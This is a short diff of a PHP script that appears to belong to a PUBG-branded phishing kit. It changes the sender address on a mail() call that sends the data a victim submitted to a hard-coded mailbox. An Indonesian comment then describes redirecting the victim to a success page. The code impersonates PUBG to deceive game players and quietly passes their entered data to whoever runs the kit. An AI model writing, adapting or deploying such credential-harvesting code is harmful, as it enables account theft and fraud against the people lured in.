@@ -134,7 +134,7 @@ Temukan saya:
 EOD;
 $headers  = 'MIME-Version: 1.0' . "\r\n";
 $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
-$headers .= 'From: PUBG by NiodTech <resultniod@gmail.com>' . "\r\n";
+$headers .= 'From: PUBG by NiodTech <muhammadsairi519@gmail.com>' . "\r\n";
 $kirim = mail($emailku, $subjek, $pesan, $headers);
 
 //MENERIMA DATA YANG BERHASIL DI-INPUT DAN MENGALIHKAN KE HALAMAN BERHASIL
